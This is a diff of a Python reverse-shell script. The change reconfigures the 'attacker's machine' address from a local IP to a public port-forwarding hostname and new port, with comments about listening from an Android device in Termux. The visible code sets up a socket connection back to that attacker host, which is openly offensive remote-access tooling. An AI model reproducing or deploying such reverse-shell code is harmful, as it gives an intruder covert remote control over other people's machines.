@@ -4,8 +4,9 @@ import os
 import time
 
 # Set up the IP and port of the attacker's machine (your Android device)
-attacker_ip = '192.168.11.10'  # Replace with your Android device's IP
-attacker_port = 4444  # The port you are listening on in Termux
+attacker_ip = 'Tec-404-26276.portmap.host'  # Replace with your Android device's IP
+attacker_port = 44664  # The port you are listening on in Termux
+## This will listen on local port "4545"
 
 def connect_shell():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
